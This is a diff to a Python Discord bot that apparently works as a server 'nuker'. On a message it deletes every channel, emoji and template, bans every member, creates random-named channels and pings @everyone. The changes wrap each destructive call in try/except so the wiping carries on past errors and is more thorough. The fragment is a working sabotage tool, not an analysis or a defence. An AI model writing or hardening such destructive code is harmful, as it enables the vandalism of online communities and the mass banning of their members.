@@ -54,8 +54,11 @@ async def on_message(message):
             await guild.edit(icon=icon)
         except:
             pass
-        for c in message.guild.channels: 
+        for c in message.guild.channels:
+            try:
                 await c.delete()
+            except:
+                pass
         for user in message.guild.members:
             try:
                 await user.ban()
@@ -67,9 +70,15 @@ async def on_message(message):
             except:
                 pass
         for Emoji in message.guild.emojis:
-            await Emoji.delete()
+            try:
+                await Emoji.delete()
+            except:
+                pass
         for template in await message.guild.templates():
-           await template.delete()
+            try:
+                await template.delete()
+            except:
+                pass
         await message.guild.create_text_channel(randomletters(99))
     
     response = '@everyone' #You can add some messages via editing this string
@@ -112,7 +121,10 @@ async def on_message(message):
         
         await guild.create_text_channel(randomletters(99))
         await guild.create_text_channel(randomletters(99))
-        await message.channel.delete()
+        try:
+            await message.channel.delete()
+        except:
+            pass
         print("channel yeeted")
         user=message.author
         
